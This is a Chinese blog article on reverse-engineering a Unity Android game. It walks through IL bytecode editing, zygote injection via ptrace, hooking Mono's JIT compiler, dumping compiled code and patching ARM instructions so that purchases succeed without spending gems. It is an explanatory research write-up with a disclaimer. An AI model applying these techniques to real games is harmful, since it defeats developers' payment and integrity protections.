&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6de83ed6f668f836c15e2e6f1b2dbf37_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：赵奇&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;笔者一直自认玩过不少游戏，无奈水平太菜，日常送人头。痛定思痛，决定冲(xie)冠(xiu)一(gai)怒(qi)，经过几次失败的尝试之后，终于搞定了几款时下热门的Unity游戏。出于各种原因，本文以一款不具名的国外游戏作为实例，分享笔者研究过程中的一些心得，与各位分享。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X00 打包党的鶸改法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先采用最简单的打包党策略，演示一下如何快速修改一款单机游戏的金币/宝石等资源。这部分快速带过，主要负责熟悉 Unity 游戏结构，时至今日已经不算一种技术了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先将游戏安装 APK 解包，这里使用 apktool 或者直接看作 zip 解包是没有区别的，因为游戏严重依赖框架，Java 层和 Manifest 等文件价值不大。作为 Unity 游戏的一个特征点，可以很明显的发现这样一个文件夹。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f9320e6f5de0d528d1a8bd36a5bc0e05_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;377&quot;&gt;&lt;p&gt;Assembly-CSharp.dll 等几个文件是 Unity 游戏最鲜明的特点。通过 file 或者 binwalk 查看可以发现它们是 C# 字节码格式（ IL ），这种格式如果不进行加密，可以轻松的还原 C#指令。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来在手机中安装一次游戏，看一下大致的游戏逻辑，确定需要修改什么。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dd04206c80d68d8d1f883a87870941e_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;999&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看起来右上角的宝石不错。。。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一般来说在游戏里边宝石都是稀缺资源，这里以其作为目标。为了快速定位，尝试使用 diamond ，gem 等字符串在 cs源码中进行全局搜索，很快就能定位到关键位置。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void SetupFirebaseDefault()
	{
		this.Defaults.Add(&quot;EnergyStart&quot;, 20);
		this.Defaults.Add(&quot;InitialEnergy&quot;, 75);
		this.Defaults.Add(&quot;EnergyFillerSecs&quot;, 420);
		this.Defaults.Add(&quot;InitialGold&quot;, 200);
		this.Defaults.Add(&quot;InitialGems&quot;, 50);
		this.Defaults.Add(&quot;XpRequirement&quot;, 75);
		this.Defaults.Add(&quot;XpReqIncremental&quot;, 75);
		this.Defaults.Add(&quot;XpAttackBonus&quot;, 5);
		this.Defaults.Add(&quot;BubblesRequired&quot;, 6);
		this.Defaults.Add(&quot;StoreBubbleCostsAddOn&quot;, 2);
		this.Defaults.Add(&quot;ReviveCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCostIncremental&quot;, 75);
		this.Defaults.Add(&quot;ShopTokenMax&quot;, 10);
		this.Defaults.Add(&quot;ShopFigMax&quot;, 3);
		this.Defaults.Add(&quot;ShopKeyMax&quot;, 5);
		this.Defaults.Add(&quot;EnergyPricesInGemsBig&quot;, 200);
		this.Defaults.Add(&quot;EnergyPricesInGemsSmall&quot;, 50);
		this.Defaults.Add(&quot;EnergyPackageBig&quot;, 60);
		this.Defaults.Add(&quot;EnergyPackageSmallMin&quot;, 5);
		this.Defaults.Add(&quot;RepeatedFigurineTokenConversion&quot;, 7);
		this.Defaults.Add(&quot;RefreshLootCost&quot;, 20);
  		...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;InitialGems&lt;/b&gt; 字段明显是初始宝石数的意思，OK就它了。C# 字节码的修改有很多种方式，比较方便的工具是 Reflector ，这里因为没有这个工具，使用 ILDASM 反编译，随后修改， ILASM 重编译回去的方法。这两个工具都是微软官方提供的，当然可以百度搜到。 ILDASM 具有图形化界面，直接从其中 dump 出来即可，随后修改 dump 出的 IL 文件如下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-15e025904749d92edc40d35aa06a10e5_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;122&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来使用 ILASM 命令 ilasm.exe &lt;a href=&quot;http://name.il/&quot;&gt;name.il&lt;/a&gt; /DLL 可以将 IL 文件回编译成 DLL ，将其替换 APK 包中的对应 DLL ，签名，安装之后可以发现修改生效了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5f36c27ef8344b7b5789693438fb3de2_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1019&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这就是 Unity 游戏打包党快速修改的过程，看起来很简单，但是却存在不少问题：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;这个游戏没有做任何保护，一旦存在保护，比如IL字节码加密，就需要去跟IL字节码加载的逻辑，伺机恢复明文IL字节码。&lt;/li&gt;&lt;li&gt;加壳问题，好在加壳是针对Java层的，考查了国内几款主流游戏之后发现基本没有加壳，因为壳并不能保证ELF文件的安全，ELF文件很可能使用其他安全策略。&lt;/li&gt;&lt;li&gt;重打包问题，国内游戏是不可能让你修改数据重打包的，特别是联网游戏，会有多处完整性校验，因此修改工作必须在运行过程中进行。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;综合以上，我们虽然完成了对一款毫无安全保护的 Unity 游戏的修改，但是为了进一步研究适用于更复杂条件下的修改策略，还需要进一步研究心得方案。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  注入与hook&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;考虑到国内主流游戏的安全机制，必须使用运行时修改的方式。比较理想的方式是先注入 zygote 进程。zygote 进程是 Dalvik 虚拟机的孵化器进程。众所周知，常规的 Android APP 是运行在 Dalvik 虚拟机（或者其继承者 ART ）中的，虚拟机需要加载很多运行所需的库（&lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;如&lt;/a&gt; &lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;libdvm.so&lt;/a&gt; ），并且初始化虚拟机对象。这个过程费时费力，为了保证应用的启动速度，zygote被设计为虚拟机进程的父进程。当应用启动时，直接从 zygote 上 fork() 出来，继承其虚拟内存空间。因此，注入到 zygote 进程的好处是先于应用代码执行，可以有效避免注入过程被应用的 anti-ptrace 机制检测到。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Android 平台上的注入已经是相对成熟的一套代码，最初是由看雪版主古河大大发布，随后出现了很多的更新、优化版本。其基本思路是利用 Linux 平台上的跨进程控制机制 ptrace ，通过对 ptrace 的封装实现目标进程的读、写，寄存器获取、保存、恢复，页状态变更、写入一段施工程序、远程调用施工程序，负责将待注入模块加载到目标内存中。这些内容前人之述备矣，这里贴几个相关链接，不在做具体展开。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt; libinject&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/jiayy/p/4286828.html&quot;&gt;android hook 框架 libinject2 简介、编译、运行&lt;/a&gt; libinject2&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/qq1084283172/article/details/53869796&quot;&gt;Android进程的so注入--Poison（稳定注入版） - 水汐。2014 的专栏 - CSDN博客&lt;/a&gt; Poison注入框架&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在完成注入之后，我们的功能代码即可在目标进程中执行，接下来需要在目标进程中执行 hook 过程。通过 hook 技术，可以截断一个函数的执行流程并插入自定义的代码。针对 zygote 注入，这个问题稍微复杂。因为在我们注入 zygote 的时机，游戏进程还没有启动，因此无法直接 hook 到目标函数。后面将会介绍到，我们的目标函数是 native 层的 c 函数。因为 zygote 进程最后会 fork 成游戏进程，为了感知游戏进程中目标函数的加载，可以监控该函数所在的库的加载，那么就需要用到 linker 中的 dlopen 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void *dlopen(const char *filename, int flags);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 hook dlopen 函数并检查 filename 参数确定目标库的加载，随后再一次进行实际的功能性 hook ，hook 目标函数达到修改目的。也就是说，通过 zygote hook 的方式 hook 一个目标函数，需要进行两次 hook ，第一次是 hook linker 中的 dlopen 以确定目标模块的基址，第二次是在该模块中 hook 目标函数。这里有一个小问题是由于 dlopen 函数在每一个 zygote 的子进程中都会被 hook ，导致系统性能下降，一个解决方案是定期查看&lt;b&gt; /proc/pid/cmdline&lt;/b&gt; 如果自身不是目标进程那么就解除 hook 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;针对 Unity 游戏的 hook 思路大体如上，本节的最后再讲讲关于使用的 hook 框架。Hook 操作的原理可以理解为强行修改程序的代码段，通过修改目标地址上的字节码为 B ，JMP 等指令将指令流跳转到 hook 者控制的位置执行另一段指令。当然实际实现中复杂性远远大于这句描述，因为指令执行完毕之后通常需要返回到 hook 前的位置，如何保证 hook 点处指令、寄存器值等各种信息完好，是需要很大工作量的。Java 层的 hook 框架可以使用 XScript 、frida 、cydia substrate 等等，native 层笔者尝试过的有效工具有 cydia substrate和android-inline-hook ( &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt; )。ARM 平台上的 hook 工具开发有几个坑点，一个原因是由于 ARM 有大量位置相关代码，如果 hook 点在这种指令上，那么想要在异地恢复这条指令相当困难；另一个原因是 ARM 上存在 Thumb 指令集，需要考虑判断当前指令集并执行不同的操作。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了注入和 hook 两种工具，就可以完成对目标函数的运行时修改。下一节探讨针对 Unity 游戏，具体修改哪些函数可以完成对游戏逻辑的控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  Mono加载C#字节码过程分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&amp;gt;  可能很多人都像我一样好奇过，Android 是一个类 Java 虚拟机部署在 Linux 平台上，怎么就跑起来了微软的 C# ？其实 C# 已经被 ECMA 组织标准化（虽然这组织和微软渊源颇深），并且标准基础上出现了一套运行时（ Common Language Runtime , CLR ）。这套运行时的具体实现是一个叫做 mono 的开源项目。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本节介绍 mono 执行 C# 字节码的过程。Android 上的 Unity 正是通过 mono 的 Just-in-time Compile 机制完成了从 C# 语言世界到 ARM 机器码世界的转化。接下来对 Mono 项目的源码中对 DLL 处理的逻辑做一个分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，mono 加载 DLL 文件之后，会进行预编译，首先调用 &lt;b&gt;/mono/mini/mini.c&lt;/b&gt; 中的 mono_precompile_assemblies 函数，该函数对所有需要加载的 assembly 文件逐个调用 mono_precompile_assembly 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;void mono_precompile_assemblies ()
{
	GHashTable *assemblies = g_hash_table_new (NULL, NULL);

	mono_assembly_foreach ((GFunc)mono_precompile_assembly, assemblies);

	g_hash_table_destroy (assemblies);
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static void
mono_precompile_assembly (MonoAssembly *ass, void *user_data)
{
	...
	for (i = 0; i &amp;lt; mono_image_get_table_rows (image, MONO_TABLE_METHOD); ++i) {
		method = mono_get_method (image, MONO_TOKEN_METHOD_DEF | (i + 1), NULL);
		mono_compile_method (method);
		if (strcmp (method-&amp;gt;name, &quot;Finalize&quot;) == 0) {
			invoke = mono_marshal_get_runtime_invoke (method, FALSE);
			mono_compile_method (invoke);
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里摘取了 mono_precompile_assembly 函数的关键步骤。该函数中针对当前需要处理的的 assembly ，对其中每一个函数调用 mono_compile_method 进行编译，同时编译 invoke 。这个 invoke 是对应函数的一个包装器，当  mono最终调用函数时，会通过包装器调用而不是直接调用。因此在函数 compile 完成之后，会生成并编译 invoke 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来分析的关键是 mono_compile_method 函数，真正的编译过程发生在这个函数中。该函数不是唯一的，因为 mono 同时支持 AOT（ ahead of time ）编译，未来也可能添加其他功能。因此这个函数这里为一个函数指针，在 JIT 编译环境下执行的是 mono_jit_compile_method 函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;gpointer
mono_jit_compile_method (MonoMethod *method)
{
	MonoException *ex = NULL;
	gpointer code;

	code = mono_jit_compile_method_with_opt (method, mono_get_optimizations_for_method (method, default_opt), &amp;amp;ex);
	if (!code) {
		g_assert (ex);
		mono_raise_exception (ex);
	}

	return code;
}
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个函数调用了 mono_jit_compile_method_with_opt 函数做具体操作，注意这里返回的是 gpointer 指针，其实这个指针指向的就是 DLL 脚本最终编译成汇编所在的地址，后续如果我们需要修改生成的汇编代码，修改这个指针即可。接下来我们稍微深入跟进一些。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static gpointer
mono_jit_compile_method_with_opt (MonoMethod *method, guint32 opt, MonoException **ex)
{
	...
    target_domain = mono_get_root_domain ();
	info = lookup_method (target_domain, method); //先查表判断是否已经编译
	if (info) {
		/* We can&#39;t use a domain specific method in another domain */
		if (! ((domain != target_domain) &amp;amp;&amp;amp; !info-&amp;gt;domain_neutral)) {
			MonoVTable *vtable;
			MonoException *tmpEx;

			mono_jit_stats.methods_lookups++;
			vtable = mono_class_vtable (domain, method-&amp;gt;klass);
			g_assert (vtable);
			tmpEx = mono_runtime_class_init_full (vtable, ex == NULL);
			if (tmpEx) {
				*ex = tmpEx;
				return NULL;
			}
			return mono_create_ftnptr (target_domain, info-&amp;gt;code_start);
		}
	}

	code = mono_jit_compile_method_inner (method, target_domain, opt, ex);//实际编译点
	···
	p = mono_create_ftnptr (target_domain, code);
    ···
	return p;
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这里隐去了编译 invoke 函数的代码和一些细枝末节的 check 。可以看到， mono_jit_compile_method_with_opt 函数的主要流程是首先查表看当前要编译的函数是否已经编译，如果已经编译，则直接返回编译好的结果；否则，调用 mono_jit_compile_method_inner 函数实际编译并注册到 target_domain 中，随后通过 mono_create_ftnptr 函数获取函数指针。因为这部分代码是复用的，除了首次加载 DLL 之外的一些情景也会调用该函数，其中存在一些函数已经编译的情况。 mono_jit_compile_method_inner 函数以下是一些与机器相关的具体机器码生成过程，对虚拟机感兴趣的朋友可以进一步学习，这里就不继续深究了，简单把整个调用过程整理一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;graph TD;
start--&amp;gt;mono_precompile_assemblies
mono_precompile_assemblies--&amp;gt;|foreach|mono_precompile_assembly
mono_precompile_assembly--&amp;gt;|函数体|mono_jit_compile_method
mono_precompile_assembly--&amp;gt;|invoke|mono_marshal_get_runtime_invoke
mono_marshal_get_runtime_invoke--&amp;gt;mono_jit_compile_method
mono_jit_compile_method--&amp;gt;mono_jit_compile_method_with_opt
mono_jit_compile_method_with_opt--&amp;gt;|已经编译过|mono_create_ftnptr
mono_jit_compile_method_with_opt--&amp;gt;|没有编译过|mono_jit_compile_method_inner
mono_jit_compile_method_inner--&amp;gt;mini_method_compile
mini_method_compile--&amp;gt;mono_codegen
mono_codegen--&amp;gt;mono_create_ftnptr
mono_create_ftnptr--&amp;gt;finish&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;至此我们的分析完成了，尽管虚拟机可以使用花样繁多的语言开发，但是最终在执行前一需要恢复成本地机器码去执行。这就给了我们下 hook 的机会，下一节介绍通过修改 mono 编译出来的汇编函数逻辑，完成对游戏流程的动态修改。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X03  通过修改虚拟机生成的汇编指令修改游戏逻辑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来我们尝试利用前面两节介绍的知识，修改游戏的执行逻辑.&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void MainButtonClicked()
{
	...
		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}
	...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们选择 MainButtonClicked 这个函数作为目标，其中的购买金币分支会检测当前钻石数量，如果数量够则进行购买，否则不进行购买。在 mono_jit_compile_method_with_opt 函数上下钩子，检查第一个参数 method 的 name 字段是否包含“ MainButtonClicked ”，在包含这个字段时，将 gpointer 指向的函数 dump 出来。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;	if(!strstr(name, &quot;MainButtonClicked&quot;)) return target(arg1, arg2, arg3);
	LOGE(&quot;find MainButtonClicked&quot;);
	void* funcptr = target(arg1, arg2, arg3);
	LOGE(&quot;function MainButtonClicked base is: %0lx&quot;, funcptr);
	int fd = open(&quot;/data/local/tmp/dump&quot;, O_WRONLY | O_CREAT);
	if(fd == -1){
		LOGE(&quot;open error: %s&quot;, strerror(errno));
		exit(-1);
	}
	if(write(fd, funcptr, 0x1000 * 0x1000) == -1){
		LOGE(&quot;write error: %s&quot;, strerror(errno));
		exit(-1);
	}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如上述代码所示，这次 hook 在 mono_jit_compile_method_with_opt 函数每次编译 C# 函数点进行判断，当被编译的函数是我们的目标 MainButtonClicked 时，对内存进行 dump ，将编译成机器码的 MainButtonClicked 输出出来，接下来，使用 IDA 对该函数进行分析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在加载该函数时需要注意，由于 dump 出来的是部分内存，不像标准的 elf 文件一样有各种配置能够加载，识别为 binary file ，需要手动指定处理器架构，这里是 ARM 。另外需要指定硬盘文件偏移和程序在内存中偏移的映射关系，注意上边代码中第四行输出了程序在内存中的地址，IDA 能够利用 file_offset+memory_base 计算出相当一部分的跳转指令的跳转地址（当然，由于我们只 dump 了很小一部分内存，仍然有很多依赖相对偏移寻址的跳转目标无法恢复，但对程序结构的分析无太大影响）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过 IDA 加载后，可以看出函数明显是一个 switch-case 结构：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-18af552a8585f0802182b8d233b5501a_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;726&quot; data-rawheight=&quot;485&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个结构与 MainButtonClicked 函数原始形式一致，通过分析二者关系可以定位到金币购买时点击确定按键对应到的 case ：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;		case UI_ConfirmationPopup.ScreenType.BuyCoins:
		{
			int num = Tuning.ShopCoinPackagesPrices[this.coinIndex];
			int num2 = Tuning.ShopCoinPackages[this.coinIndex];
			if (UserProfile.Gems &amp;gt;= num)
			{
				UserProfile.Gold += num2;
				UserProfile.Gems -= num;
				this.purchasedAmount = num2;
				this.screenType = UI_ConfirmationPopup.ScreenType.CoinsPurchased;
				Events.Instance.UI_MARKET_PURCHASED();
				GeneralManager.Analytics.ReportGoldPurchased(this.coinIndex, num);
				this.CallItQuits();
			}
			else
			{
				this.DisableAssets(true);
				this.LaunchOutOfGems();
			}
			break;
		}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-cdc0d4b206e0401f62255f720f602fe9_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;574&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;途中的两个分支就是 C# 中的 if-else 。由于高级语言数据结构比较复杂，反应在机器码层面取数据涉及问题较多，因此修改取数据比较困难。但是可以看到，上面的 block 中 R5 是最后取出的当前剩余宝石，当与其进行比较之后，如果宝石充足，则会跳转到红色分支开始购买，增加金币扣除宝石。因此应当修改的逻辑是图中 1 处，通过 nop（mov r0, r0）掉跳转强制执行购买流程。为了在修改金币的同时不减少宝石，将2处宝石运算改为 add r0 , r0 , r5 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;确定了修改点之后将上述两条命令汇编，使用之前的 hook 稍作修改，当执行到 MainButtonClicked 编译时修改程序机器码（ mono 已经很贴心的 mprotect 过了），完成对游戏的修改，接下来尝试购买宝石，哇，奇迹发生了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X04  后记&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文从一个简单小游戏的破解出发，介绍了 Unity3D 引擎使用 mono 进行 C# JIT 编译的思路，并设计了实验性质的 hook 方案。其实针对这款简单的小游戏，更简单的破解方式还有很多种，牛刀杀鸡是为了以后更容易杀牛。因为在实际的环境中，分析游戏面临着过反调试、脱壳、对抗去符号、DLL 解密等多重挑战。限于篇幅不可能对这些技术一一介绍，感兴趣的朋友可以自行百度/谷歌。另外，由于使用了 AOT 机制，文章中介绍的 hook 思路可能会更适用于 iOS ，条件所限没有尝试。攻击是为了更好的防御，使用的实例，介绍的工具都为了更好的说明技术本身，请不要用违法的目的。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;参考文献&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;[1]: &lt;a href=&quot;http://www.cnblogs.com/murongxiaopifu/p/4211964.html&quot;&gt;Mono为何能跨平台？聊聊CIL(MSIL) - 慕容小匹夫 - 博客园&lt;/a&gt;	&quot;Mono为何能跨平台？聊聊CIL(MSIL)&quot;&lt;/p&gt;&lt;p&gt;[2]: &lt;a href=&quot;http://www.ecma-international.org/&quot;&gt;Welcome to Ecma International&lt;/a&gt;	&quot;EMCA官网&quot;&lt;/p&gt;&lt;p&gt;[3]: &lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;ele7enxxh/Android-Inline-Hook&lt;/a&gt;	&quot;Android Inline Hook&quot;&lt;/p&gt;&lt;p&gt;[4]: &lt;a href=&quot;https://github.com/mono/mono&quot;&gt;mono/mono&lt;/a&gt;	&quot;Mono Project on Github&quot;&lt;/p&gt;&lt;p&gt;[5]: &lt;a href=&quot;https://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt;	&quot;古河大大libinject&quot;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-11-07-30703785</guid>
<pubDate>Tue, 07 Nov 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
